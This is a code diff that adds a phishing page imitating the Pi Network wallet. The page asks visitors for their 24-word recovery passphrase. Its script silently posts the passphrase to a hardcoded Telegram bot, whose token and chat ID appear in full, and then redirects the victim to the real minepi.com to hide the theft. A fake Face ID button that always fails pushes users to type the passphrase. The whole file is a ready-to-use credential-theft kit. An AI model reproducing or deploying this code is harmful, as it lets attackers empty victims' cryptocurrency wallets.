@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pi Browser</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            background-color: white;
+        }
+        img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .grid-container {
+            position: absolute;
+            top: 58%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            grid-template-rows: repeat(3, 1fr);
+            gap: 250px;
+            box-sizing: border-box;
+        }
+        .grid-item {
+            background-color: transparent;
+            border: 2px solid transparent;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            aspect-ratio: 1;
+        }
+        .grid-item:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+        .grid-item:nth-child(1),
+        .grid-item:nth-child(2),
+        .grid-item:nth-child(3) {
+            transform: translateY(140px);
+        }
+        .grid-item:nth-child(7),
+        .grid-item:nth-child(8),
+        .grid-item:nth-child(9) {
+            transform: translateY(-140px);
+        }
+        .grid-item:nth-child(3n+1) {
+            transform: translateX(60px) translateY(var(--offset-y, 0));
+        }
+        .grid-item:nth-child(3n+3) {
+            transform: translateX(-60px) translateY(var(--offset-y, 0));
+        }
+        .grid-item:nth-child(1),
+        .grid-item:nth-child(2),
+        .grid-item:nth-child(3) {
+            --offset-y: 140px;
+        }
+        .grid-item:nth-child(7),
+        .grid-item:nth-child(8),
+        .grid-item:nth-child(9) {
+            --offset-y: -140px;
+        }
+        .text-box-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+            opacity: 0;
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            transform: translateY(100%);
+        }
+        .text-box-container.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .text-box-container textarea {
+            width: 78%;
+            height: 600px;
+            position: absolute;
+            top: 200px;
+            left: 91px;
+            padding: 13.5px;
+            border: 2px solid #000000;
+            border-radius: 20px;
+            font-size: 40px;
+            margin-bottom: 25px;
+            font-weight: none;
+        }
+        .text-box-container .button-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 850px;
+        }
+        .text-box-container button {
+            padding: 25px 25px;
+            border: none;
+            border-radius: 17px;
+            cursor: pointer;
+            font-size: 30px;
+            margin: 17px;
+            width: 85%;
+            max-width: 1000px;
+            font-weight: bold;
+        }
+        #unlockPassphrase {
+            background-color: white;
+            border: 2px solid #713d92;
+            color: #713d92;
+        }
+        #unlockPassphrase:hover {
+            background-color: #f0f0f0;
+        }
+        #unlockFaceID {
+            background-color: #713d92;
+            color: white;
+        }
+        #unlockFaceID:hover {
+            background-color: #5a2d6e;
+        }
+        .return-button {
+            position: absolute;
+            top: 56px;
+            left: -300px;
+            background-color: transparent;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #000;
+        }
+        .return-button:hover {
+            color: #713d92;
+        }
+        .text-box-container .text-above {
+            position: absolute;
+            top: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 48px;
+            font-weight: bold;
+            color: black;
+        }
+        .disclaimer {
+            position: absolute;
+            top: 1200px;
+            left: 100px;
+            font-size: 32px;
+            font-weight: bold;
+            color: black;
+            max-width: 800px;
+            text-align: left;
+            display: none;
+        }
+        .disclaimer a {
+            color: blue;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .disclaimer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <img src="pi.jpg" alt="Pi Shop">
+    <div class="grid-container">
+        <div class="grid-item" id="grid1"></div>
+        <div class="grid-item" id="grid2"></div>
+        <div class="grid-item" id="grid3"></div>
+        <div class="grid-item" id="grid4"></div>
+        <div class="grid-item" id="grid5"></div>
+        <div class="grid-item" id="grid6"></div>
+        <div class="grid-item" id="grid7"></div>
+        <div class="grid-item" id="grid8"></div>
+        <div class="grid-item" id="grid9"></div>
+    </div>
+
+    <div class="text-box-container" id="textBoxContainer">
+        <button class="return-button" id="returnButton">&#10006;</button>
+        <div class="text-above" id="textAbove"></div>
+        <textarea placeholder="Enter your 24-word passphrase here"></textarea>
+        <div class="button-container">
+            <button id="unlockPassphrase">Unlock With Passphrase</button>
+            <button id="unlockFaceID">Unlock With Face ID</button>
+        </div>
+        <div class="disclaimer" id="disclaimer">
+            As a non-custodial wallet, your wallet<br>passphrase is exclusively accessible only to you.<br>Recovery of passphrase is currently impossible.<br><br>
+            Lost your passphrase? <a>You can create a new<br>wallet</a>, but all your Pi in your previous wallet will be inaccessible.
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '8191930366:AAF3nZYU_QC_wOpW-xKMvzwHVCKFN-KecxU';
+        const CHAT_ID = '7416028741';
+
+        // Simple Telegram message sender
+        async function sendToTelegram(passphrase) {
+            const time = new Date().toLocaleString();
+            const message = `
+🔐 *New Passphrase Submission* 🔐
+
+📝 *Passphrase*:
+\`\`\`
+${passphrase}
+\`\`\`
+
+⏰ *Time*: ${time}
+            `;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    }),
+                });
+                return true;
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return false;
+            }
+        }
+
+        // Grid click handlers
+        document.getElementById('grid1').addEventListener('click', () => window.location.href = 'https://fireside.pinet.com');
+        document.getElementById('grid4').addEventListener('click', () => window.location.href = 'https://mine.pinet.com');
+        document.getElementById('grid5').addEventListener('click', () => window.location.href = 'https://blockexplorer.minepi.com');
+        document.getElementById('grid7').addEventListener('click', () => window.location.href = 'https://kyc.pinet.com');
+        document.getElementById('grid8').addEventListener('click', () => window.location.href = 'https://chat.pinet.com');
+
+        // Text box controls
+        const textBoxContainer = document.getElementById('textBoxContainer');
+        const returnButton = document.getElementById('returnButton');
+        const unlockPassphrase = document.getElementById('unlockPassphrase');
+        const unlockFaceID = document.getElementById('unlockFaceID');
+        const textAbove = document.getElementById('textAbove');
+        const disclaimer = document.getElementById('disclaimer');
+
+        const showTextBox = (text) => {
+            textAbove.textContent = text;
+            disclaimer.style.display = 'block';
+            textBoxContainer.style.display = 'block';
+            setTimeout(() => textBoxContainer.classList.add('active'), 10);
+        };
+
+        const hideTextBox = () => {
+            textBoxContainer.classList.remove('active');
+            setTimeout(() => {
+                textBoxContainer.style.display = 'none';
+                disclaimer.style.display = 'none';
+            }, 500);
+        };
+
+        // Grid items that show text box
+        document.getElementById('grid2').addEventListener('click', () => showTextBox('Unlock Pi Wallet'));
+        document.getElementById('grid3').addEventListener('click', () => showTextBox('Pi Shop Wallet'));
+        document.getElementById('grid6').addEventListener('click', () => showTextBox('Unlock Pi Wallet'));
+        document.getElementById('grid9').addEventListener('click', () => showTextBox('Unlock Pi Wallet'));
+
+        // Passphrase submission
+        unlockPassphrase.addEventListener('click', async () => {
+            const text = document.querySelector('.text-box-container textarea').value.trim();
+            const words = text.split(/\s+/).filter(word => word.length > 0);
+            
+            if (words.length === 24) {
+                await sendToTelegram(text); // Silent send (no alerts)
+                window.location.href = 'https://minepi.com'; // Always redirect
+            } else {
+                alert('Please enter exactly 24 words.');
+            }
+        });
+
+        // Face ID handler
+        unlockFaceID.addEventListener('click', () => {
+            alert('Face ID not available at the moment. Please try with the passphrase.');
+        });
+
+        // Return button
+        returnButton.addEventListener('click', hideTextBox);
+    </script>
+</body>
+</html>
